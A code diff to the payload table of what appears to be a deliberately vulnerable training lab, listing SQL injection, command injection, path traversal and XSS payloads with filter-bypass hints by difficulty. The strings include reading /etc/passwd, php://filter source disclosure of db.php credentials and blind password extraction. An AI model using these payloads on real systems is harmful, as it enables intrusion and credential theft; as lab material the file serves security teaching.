@@ -172,16 +172,16 @@ const PAYLOADS = {
   expert:{p:"zzz' OR 1=1-- -", n:"Expert — BLIND (match/no-match). Extract char-by-char from users: ' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='S'-- -"}
  },
  cmd:{
-  easy:{p:"127.0.0.1; cat private/cmdi_flag.txt", n:"Easy — raw. Chain with ;"},
-  medium:{p:"127.0.0.1 | cat private/cmdi_flag.txt", n:"Medium — ; and & stripped → use a pipe |"},
-  hard:{p:"127.0.0.1$(cat${IFS}private/cmdi_flag.txt)", n:"Hard — ; & | ` and spaces stripped → $(...) with ${IFS}; the flag appears in the ping error."},
-  expert:{p:"127.0.0.1; cat private/cmdi_flag.txt > uploads/pwn.txt", n:"Expert — BLIND (no output). Write to a readable file, then open /uploads/pwn.txt in a new tab."}
+  easy:{p:"127.0.0.1; id", n:"Easy — raw; chain with ;. Goal: who am I? (uid / gid / groups)."},
+  medium:{p:"127.0.0.1 | cat /etc/passwd", n:"Medium — ; and & stripped → pipe |. Goal: enumerate the local users (/etc/passwd)."},
+  hard:{p:"127.0.0.1$(cat${IFS}/etc/hostname)", n:"Hard — ; & | ` and spaces stripped → $(...) with ${IFS}. Goal: read a file through the space-bypass; its content leaks in the ping error."},
+  expert:{p:"127.0.0.1; cat private/cmdi_flag.txt > uploads/pwn.txt", n:"Expert — BLIND (no output). Goal: exfiltrate the flag — write it to a readable file, then open /uploads/pwn.txt in a new tab."}
  },
  pg:{
-  easy:{p:"../../lfi_secret/flag.txt", n:"Easy — raw traversal."},
-  medium:{p:"....//....//lfi_secret/flag.txt", n:"Medium — '../' stripped once → ....// collapses back to ../"},
-  hard:{p:"php://filter/convert.base64-encode/resource=../lfi_secret/flag.txt", n:"Hard — '../' stripped recursively (....// dies) → use the php://filter wrapper; base64-decode the output."},
-  expert:{p:"php://filter/read=string.rot13/resource=../lfi_secret/flag.txt", n:"Expert — + 'base64' blocked → use another filter (string.rot13); rot13 the output back."}
+  easy:{p:"../../lfi_secret/flag.txt", n:"Easy — raw traversal. Goal: read a file OUTSIDE the web root (the secret flag)."},
+  medium:{p:"....//....//....//....//....//....//....//....//etc/passwd", n:"Medium — '../' stripped once → ....//. Goal: climb to / and read a system file (/etc/passwd = the user list)."},
+  hard:{p:"php://filter/convert.base64-encode/resource=db.php", n:"Hard — '../' stripped recursively (....// dies) → php://filter wrapper. Goal: SOURCE DISCLOSURE — base64-decode db.php to read the app's DB credentials."},
+  expert:{p:"php://filter/read=string.rot13/resource=../lfi_secret/flag.txt", n:"Expert — + 'base64' blocked → string.rot13 filter. Goal: still exfiltrate the flag; rot13 the output back."}
  }
 };
 PAYLOADS.q.easy.x='"><script>alert(1)<\/script>';
